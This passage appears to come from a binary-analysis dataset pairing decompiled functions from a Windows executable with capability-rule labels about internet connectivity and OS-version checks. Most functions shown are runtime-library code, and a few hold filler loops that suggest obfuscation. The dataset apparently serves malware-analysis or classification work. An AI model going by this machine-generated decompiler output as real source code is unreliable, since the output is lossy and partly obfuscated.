-0x3c) == 0) break;\n        do {\n            cVar5 = pcVar2[iVar11];\n            if (cVar5 != '\\0') {\n                do {\n                    if (cVar5 == *pcVar2) break;\n                    iVar11 = iVar11 + 1;\n                    cVar5 = pcVar2[iVar11];\n                } while (cVar5 != '\\0');\n            }\n            bVar13 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar12) == '\\0') {\n                iVar11 = iVar11 + uVar10;\n                if ((pcVar2[iVar11] == *pcVar2) || (pcVar2[iVar11] == '\\0')) {\n                    if (0x7e < uVar10) {\n                        uVar10 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar13) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar10;\n                    uVar10 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar12;\n                    goto code_r0x0046659e;\n                }\n                cVar5 = fcn.00404011(*(unaff_EBP + -0x48));\n                if (cVar5 != '\\0') {\ncode_r0x00466563:\n                    uVar10 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar10;\n                    if (0x7e < uVar10) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar12) = uVar8;\n                    goto code_r0x0046659e;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    if (*(*(unaff_EBP + -0x34) + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    bVar13 = pcVar2[iVar11] == *(*(unaff_EBP + -0x34) + 5);\n                }\n                else {\n                    *(unaff_EBP + -0x54) = pcVar2[iVar11];\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x578000)(*(unaff_EBP + -0x54));\n                    uVar4 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x2a) = uVar4;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.004019e7();\n                    }\n                    *(unaff_EBP + -0x4c) = *(iVar7 + 5);\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x10);\n                    (**0x578000)(*(unaff_EBP + -0x4c));\n                    cVar5 = (*pcVar3)();\n                    uVar12 = *(unaff_EBP + -0x44);\n                    bVar13 = *(unaff_EBP + -0x2a) == cVar5;\n                }\n                if (!bVar13) goto code_r0x00466563;\n                uVar10 = *(unaff_EBP + -0x30);\n                cVar5 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar13) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar11 = iVar11 + *(iVar7 + uVar12);\ncode_r0x0046659e:\n                cVar5 = *(unaff_EBP + -0x29);\n            }\n            uVar12 = uVar12 + 1;\n            *(unaff_EBP + -0x44) = uVar12;\n        } while (uVar12 < *(unaff_EBP + -0x3c));\n        if ((cVar5 == '\\0') || (cVar5 = fcn.00404011(*(unaff_EBP + -0x48)),  cVar5 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.00401c7b();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar10 = *(unaff_EBP + -0x30);\n    }\n    fcn.00402a0e();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 1854
    },
    "00404458": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nuint __cdecl fcn.00404458(uint arg_8h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    for (var_10h = 0x1d; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 0x48; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    for (var_18h = 0x11; 0 < var_18h; var_18h = var_18h + -1) {\n    }\n    fcn.00403b02(&stack0x00000014, &stack0x0000002c);\n    fcn.00403b02();\n    return 0x1dfb;\n}\n",
        "token_count": 259
    },
    "00404462": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404462(code **param_1)\n\n{\n    *param_1 = vtable.std::locale::_Locimp.0;\n    fcn.00406424(param_1);\n    if (param_1[6] != NULL) {\n        fcn.00404179(param_1[6]);\n    }\n    param_1[6] = NULL;\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 103
    },
    "0040448a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040448a(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x451680;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 3;\n    fcn.00401e79(\"tdxpvucysbpewikkhoekofoqzplannsdpltyxwbbsm\");\n    for (var_4ch = 0x4a; 0 < var_4ch; var_4ch = var_4ch + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x1344f;\n}\n",
        "token_count": 303
    },
    "0040448f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040448f(ulong *arg_8h, ulong *arg_ch, ulong *arg_10h, int32_t arg_14h)\n\n{\n    ulong uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_20h;\n    char *var_1ch;\n    ulong uStack28;\n    ulong uStack20;\n    ulong uStack12;\n    \n    if (*0x575708 == 0) {\n        pcVar2 = fcn.00402fe5;\n    }\n    else {\n        pcVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x575748);\n    }\n    if (0x1a < arg_14h) {\n        if (arg_14h != 0x1b) {\n            if (arg_14h == 0x1c) {\n                var_1ch = 0x558864;\n            }\n            else if (arg_14h == 0x31) {\n                var_1ch = \"sqrt\";\n            }\n            else if (arg_14h == 0x3a) {\n                var_1ch = \"acos\";\n            }\n            else {\n                if (arg_14h != 0x3d) {\n                    if ((arg_14h != 1000) && (arg_14h != 0x3e9)) {\n                        return;\n                    }\n                    uVar1 = *arg_8h;\n                    goto code_r0x004e0028;\n                }\n                var_1ch = \"asin\";\n            }\n            goto code_r0x004e0088;\n        }\n        var_20h = 2;\ncode_r0x004e00ce:\n        var_1ch = 0x558864;\n        goto code_r0x004e00d5;\n    }\n    if (arg_14h == 0x1a) {\n        uVar1 = 0x3ff0000000000000;\ncode_r0x004e0028:\n        *arg_10h = uVar1;\n        return;\n    }\n    if (0xe < arg_14h) {\n        if (arg_14h == 0xf) {\n            var_1ch = 0x558860;\n        }\n        else {\n            if (arg_14h == 0x18) {\n                var_20h = 3;\n                goto code_r0x004e00ce;\n            }\n            if (arg_14h != 0x19) {\n                return;\n            }\n            var_1ch = 0x558864;\n        }\n        var_20h = 4;\n        uStack28 = *arg_8h;\n        uStack20 = *arg_ch;\n        uStack12 = *arg_10h;\n        (**0x578000)(&var_20h);\n        (*pcVar2)();\n        goto code_r0x004e010b;\n    }\n    if (arg_14h == 0xe) {\n        var_20h = 3;\n        var_1ch = 0x558860;\n    }\n    else {\n        if (arg_14h != 2) {\n            if (arg_14h == 3) {\n                var_1ch = 0x558868;\n            }\n            else {\n                if (arg_14h == 8) {\n                    var_20h = 2;\n                    var_1ch = 0x55886c;\n                    goto code_r0x004e00d5;\n                }\n                if (arg_14h != 9) {\n                    return;\n                }\n                var_1ch = 0x55886c;\n            }\ncode_r0x004e0088:\n            var_20h = 1;\n            uStack28 = *arg_8h;\n            uStack20 = *arg_ch;\n            uStack12 = *arg_10h;\n            (**0x578000)(&var_20h);\n            iVar3 = (*pcVar2)();\n            if (iVar3 == 0) {\n                puVar4 = fcn.00403a35();\n                *puVar4 = 0x21;\n            }\n            goto code_r0x004e010b;\n        }\n        var_20h = 2;\n        var_1ch = 0x558868;\n    }\ncode_r0x004e00d5:\n    uStack28 = *arg_8h;\n    uStack20 = *arg_ch;\n    uStack12 = *arg_10h;\n    (**0x578000)(&var_20h);\n    iVar3 = (*pcVar2)();\n    if (iVar3 == 0) {\n        puVar4 = fcn.00403a35();\n        *puVar4 = 0x22;\n    }\ncode_r0x004e010b:\n    *arg_10h = uStack12;\n    return;\n}\n",
        "token_count": 1073
    },
    "00404494": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404494(uint *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*(param_1 + 3) == '\\0') {\n        iVar2 = fcn.00405b64(param_1[2] + 0x250, 0x55, *param_1, param_1[1]);\n        if (iVar2 != 0) {\n            fcn.0040366b(0, 0, 0, 0, 0);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "004044c6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004044c6(int32_t arg_8h)\n\n{\n    if (*0x57504c == 0) {\n        if (arg_8h - 0x41U < 0x1a) {\n            arg_8h = arg_8h + 0x20;\n        }\n    }\n    else {\n        arg_8h = fcn.00401b77(arg_8h, 0);\n    }\n    return arg_8h;\n}\n",
        "token_count": 110
    },
    "004044da": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.004044da(uint arg_8h, uchar *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    char var_5h;\n    char *var_4h;\n    \n    *arg_ch = 0x25;\n    var_4h = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        var_4h = arg_ch + 2;\n        arg_ch[1] = 0x2b;\n    }\n    if ((arg_14h & 0x10) != 0) {\n        *var_4h = 0x23;\n        var_4h = var_4h + 1;\n    }\n    *var_4h = 0x2e;\n    var_4h[1] = 0x2a;\n    pcVar1 = var_4h + 2;\n    if (arg_10h != '\\0') {\n        var_4h[2] = arg_10h;\n        pcVar1 = var_4h + 3;\n    }\n    var_4h = pcVar1;\n    uVar2 = arg_14h & 0x3000;\n    if ((arg_14h & 4) == 0) {\n        if (uVar2 == 0x2000) {\n            var_5h = 'f';\n        }\n        else if (uVar2 == 0x3000) {\n            var_5h = 'a';\n        }\n        else if (uVar2 == 0x1000) {\n            var_5h = 'e';\n        }\n        else {\n            var_5h = 'g';\n        }\n    }\n    else if (uVar2 == 0x2000) {\n        var_5h = 'f';\n    }\n    else if (uVar2 == 0x3000) {\n        var_5h = 'A';\n    }\n    else if (uVar2 == 0x1000) {\n        var_5h = 'E';\n    }\n    else {\n        var_5h = 'G';\n    }\n    *var_4h = var_5h;\n    var_4h[1] = '\\0';\n    return arg_ch;\n}\n",
        "token_count": 525
    },
    "0040450c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040450c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    unkuint3 Var2;\n    \n    *(param_1 + 0x458) = *(param_1 + 0x458) + 1;\n    iVar1 = *(param_1 + 0x458);\n    Var2 = iVar1 >> 8;\n    if ((iVar1 != 3) && ((iVar1 != 2 || (*(param_1 + 0x45c) != 1)))) {\n        *(param_1 + 0xaa4) = 0xffffffff;\n        *(param_1 + 0xaa8) = 0xffffffff;\n        *(param_1 + 0x45c) = 0;\n        *(param_1 + 0x24) = 0;\n        *(param_1 + 0x28) = 0;\n        *(param_1 + 0x10) = *(param_1 + 0x460);\n        return CONCAT31(Var2, 1);\n    }\n    return Var2 << 8;\n}\n",
        "token_count": 241
    },
    "00404534": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00404534(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint32_t in_ECX;\n    uint32_t var_4h;\n    \n    var_4h = in_ECX;\n    if ((arg_14h != 10) || (var_4h = CONCAT31(in_ECX >> 8, 1),  -1 < arg_8h)) {\n        var_4h = var_4h & 0xffffff00;\n    }\n    fcn.004ddafb(arg_8h, arg_ch, arg_10h, arg_14h, var_4h);\n    return;\n}\n",
        "token_count": 167
    },
    "0040456b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nfloat10 __cdecl fcn.0040456b(uint arg_8h)\n\n{\n    uint var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    for (var_ch = 0x13; 0 < var_ch; var_ch = var_ch + -1) {\n    }\n    fcn.00403b02(&stack0x00000008);\n    return *0x546aa4;\n}\n",
        "token_count": 112
    },
    "00404589": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00404589(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff9c;\n    uint var_5ch;\n    uint var_58h;\n    uint var_51h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff98;\n    var_10h = 0xffffffff;\n    var_14h = 0x427080;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        iVar1 = fcn.00402513(8, in_stack_ffffff9c);\n        var_51h._0_1_ = 1;\n        fcn.00406640();\n        var_10h = 0;\n        fcn.00404714();\n        var_10h = 1;\n        fcn.00402afe(&var_51h + 1, 0);\n        var_51h._0_1_ = 0;\n        *arg_8h = iVar1;\n        fcn.00401fff();\n    }\n    *in_FS_OFFSET = var_18h;\n    return 4;\n}\n",
        "token_count": 328
    },
    "004045f2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004045f2(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    uint32_t arg_ch;\n    uint arg_8h_00;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar1 = true;\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    while( true ) {\n        if (**0x574458 == '@') {\n            return arg_8h;\n        }\n        if (**0x574458 == 'Z') {\n            return arg_8h;\n        }\n        if (bVar1) {\n            bVar1 = false;\n        }\n        else {\n            fcn.00403d55(0x2c);\n        }\n        pcVar2 = *0x574458;\n        if (**0x574458 == '\\0') break;\n        arg_ch = **0x574458 - 0x30;\n        if (arg_ch < 10) {\n            *0x574458 = *0x574458 + 1;\n            arg_8h_00 = fcn.00401f32(&var_18h, arg_ch);\n            fcn.00402eeb(arg_8h_00);\n        }\n        else {\n            var_8h = 0;\n            var_4h = 0;\n            fcn.00403693(&var_10h, &var_8h);\n            if ((1 < *0x574458 - pcVar2) && (**0x57444c != 9)) {\n                fcn.00405803(&var_10h);\n            }\n            fcn.00402eeb(&var_10h);\n            if (*0x574458 == pcVar2) {\n                arg_8h[1] = 0;\n                *arg_8h = 0;\n                *(arg_8h + 1) = 2;\n            }\n        }\n        if (*(arg_8h + 1) != '\\0') {\n            return arg_8h;\n        }\n    }\n    if ('\\x01' < *(arg_8h + 1)) {\n        return arg_8h;\n    }\n    if (*arg_8h != 0) {\n        fcn.00405713(0x555dd8);\n        return arg_8h;\n    }\n    fcn.00402eb9(1);\n    return arg_8h;\n}\n",
        "token_count": 556
    },
    "00404638": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1eh\n// WARNING: Variable defined which should be unmapped: var_4ch\n\nvoid __cdecl fcn.00404638(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    int16_t iVar10;\n    int32_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    int32_t iVar13;\n    uint uVar14;\n    ushort *puVar15;\n    ushort *puVar16;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_7ch;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_1eh;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.00405434(0xa0);\n    iVar13 = *(unaff_EBP + 0x18);\n    iVar2 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x9c) = *(unaff_EBP + 0xc);\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0xac) = *(unaff_EBP + 0x1c);\n    fcn.004032d3(uVar14);\n    *(unaff_EBP + -4) = 0;\n    piVar6 = fcn.00404b3d(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0xa8) = piVar6;\n    fcn.00405146();\n    pcVar3 = *(*piVar6 + 0x14);\n    (**0x578000)(unaff_EBP + -0x7c);\n    (*pcVar3)();\n    uVar14 = *(iVar13 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    fcn.004032d3(uVar14);\n    *(unaff_EBP + -4) = 2;\n    piVar6 = fcn.00403e2c(unaff_EBP + -0xa4);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405146();\n    pcVar3 = *(*piVar6 + 0x2c);\n    (**0x578000)(0x55486c, 0x554889, unaff_EBP + -0x4c);\n    (*pcVar3)();\n    uVar14 = *(unaff_EBP + -0x84);\n    puVar15 = *(unaff_EBP + -0x9c);\n    *(unaff_EBP + -0x7e) = 0;\n    cVar4 = fcn.0040650f(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar15 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405141();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x0047106a;\n            *puVar15 = 0x2d;\n        }\n        puVar15 = puVar15 + 1;\n        fcn.004027f7();\n    }\ncode_r0x0047106a:\n    *puVar15 = 0x7830;\n    puVar15 = puVar15 + 1;\n    *(unaff_EBP + -0x7d) = 0;\n    *(unaff_EBP + -0x98) = puVar15;\n    *(unaff_EBP + -0x90) = 0;\n    *(unaff_EBP + -0x8c) = 0;\n    cVar4 = fcn.0040650f(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        if (*(iVar2 + 6) == *(unaff_EBP + -0x4c)) {\n            fcn.004027f7();\n            cVar4 = fcn.0040650f(uVar14);\n            if (cVar4 == '\\0') {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                iVar10 = *(iVar2 + 6);\n                if (iVar10 != *(unaff_EBP + -0x1a)) {\n                    if (*(iVar2 + 4) == '\\0') {\n                        fcn.00405141();\n                        iVar10 = *(iVar2 + 6);\n                    }\n                    if (iVar10 != *(unaff_EBP + -0x1c)) goto code_r0x004710f4;\n                }\n                fcn.004027f7();\n            }\n            else {\ncode_r0x004710f4:\n                *(unaff_EBP + -0x7d) = 1;\n            }\n        }\n    }\n    *(unaff_EBP + -0xa0) = ((**(unaff_EBP + -0xac) != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar12 = unaff_EBP + -0x7c;\n    *(unaff_EBP + -0x94) = pcVar12;\n    if (0xf < *(unaff_EBP + -0x68)) {\n        pcVar12 = *(unaff_EBP + -0x7c);\n        *(unaff_EBP + -0x94) = pcVar12;\n    }\n    if ((*pcVar12 == '\\x7f') || (*pcVar12 < '\\x01')) {\n        cVar4 = fcn.0040650f(uVar14);\n        if (cVar4 == '\\0') {\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                uVar7 = fcn.00402068(unaff_EBP + -0x4c, *(iVar2 + 6));\n                if (0x15 < uVar7) break;\n                iVar13 = *(unaff_EBP + -0x90);\n                if (*(unaff_EBP + -0xa0) == iVar13 || *(unaff_EBP + -0xa0) < iVar13) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar13 != 0)) {\n                    *puVar15 = *(uVar7 + 0x55486c);\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x90) = iVar13 + 1;\n                }\n                *(unaff_EBP + -0x7d) = 1;\n                fcn.004027f7();\n                cVar4 = fcn.0040650f(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x98) = puVar15;\n        }\n    }\n    else {\n        if (*(unaff_EBP + -0x6c) == 0) {\n            *(unaff_EBP + -0x88) = 0;\n        }\n        else {\n            uVar7 = fcn.0040574f();\n            *(unaff_EBP + -0x88) = uVar7 & 0xffff;\n        }\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -0x54) = 0;\n        *(unaff_EBP + -0x50) = 0xf;\n        *(unaff_EBP + -100) = 0;\n        *(unaff_EBP + -4) = 1;\n        fcn.0040664a(1, 0);\n        *(unaff_EBP + -4) = 4;\n        iVar13 = 0;\n        cVar4 = fcn.0040650f(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') {\n            uVar7 = *(unaff_EBP + -0x50);\n            iVar8 = *(unaff_EBP + -100);\ncode_r0x004712b3:\n            do {\n                pcVar12 = *(unaff_EBP + -0x94);\n                while( true ) {\n                    if ((iVar13 == 0) || (cVar4 = *pcVar12,  cVar4 == '\\x7f')) goto code_r0x0047132a;\n                    iVar13 = iVar13 + -1;\n                    if (iVar13 != 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 != *(*(unaff_EBP + -0x88) + iVar13)) goto code_r0x00471326;\n                    }\n                    if (iVar13 == 0) {\n                        *(unaff_EBP + -0x88) = unaff_EBP + -100;\n                        if (0xf < *(unaff_EBP + -0x50)) {\n                            *(unaff_EBP + -0x88) = iVar8;\n                        }\n                        uVar7 = *(unaff_EBP + -0x50);\n                        if (cVar4 < **(unaff_EBP + -0x88)) goto code_r0x00471326;\n                    }\n                    pcVar12 = *(unaff_EBP + -0x94) + 1;\n                    if (*pcVar12 < '\\x01') break;\n                    *(unaff_EBP + -0x94) = pcVar12;\n                }\n            } while( true );\n        }\n        do {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405141();\n            }\n            uVar7 = fcn.00402068(unaff_EBP + -0x4c, *(iVar2 + 6));\n            if (uVar7 < 0x16) {\n                iVar8 = *(unaff_EBP + -0x90);\n                *(unaff_EBP + -0x7d) = 1;\n                if (*(unaff_EBP + -0xa0) == iVar8 || *(unaff_EBP + -0xa0) < iVar8) {\n                    *(unaff_EBP + -0x8c) = *(unaff_EBP + -0x8c) + 1;\n                }\n                else if ((uVar7 != 0) || (iVar8 != 0)) {\n                    *puVar15 = *(uVar7 + 0x55486c);\n                    puVar15 = puVar15 + 1;\n                    *(unaff_EBP + -0x98) = puVar15;\n                    *(unaff_EBP + -0x90) = iVar8 + 1;\n                }\n                iVar8 = unaff_EBP + -100;\n                if (0xf < *(unaff_EBP + -0x50)) {\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (*(iVar8 + iVar13) != '\\x7f') {\n                    iVar8 = unaff_EBP + -100;\n                    if (0xf < *(unaff_EBP + -0x50)) {\n                        iVar8 = *(unaff_EBP + -100);\n                    }\n                    *(iVar8 + iVar13) = *(iVar8 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar7 = *(unaff_EBP + -0x50);\n                iVar8 = *(unaff_EBP + -100);\n                iVar11 = unaff_EBP + -100;\n                if (0xf < uVar7) {\n                    iVar11 = iVar8;\n                }\n                if ((*(iVar11 + iVar13) == '\\0') || (*(unaff_EBP + -0x88) == 0)) goto code_r0x00471296;\n                iVar10 = *(iVar2 + 6);\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405141();\n                    iVar10 = *(iVar2 + 6);\n                    uVar7 = *(unaff_EBP + -0x50);\n                    iVar8 = *(unaff_EBP + -100);\n                }\n                if (iVar10 != *(unaff_EBP + -0x88)) goto code_r0x00471296;\n                fcn.00404543(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.004027f7();\n            cVar4 = fcn.0040650f(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        uVar7 = *(unaff_EBP + -0x50);\n        iVar8 = *(unaff_EBP + -100);\ncode_r0x00471296:\n        if (iVar13 == 0) goto code_r0x004712b3;\n        iVar11 = unaff_EBP + -100;\n        if (0xf < uVar7) {\n            iVar11 = iVar8;\n        }\n        if ('\\0' < *(iVar11 + iVar13)) {\n            iVar13 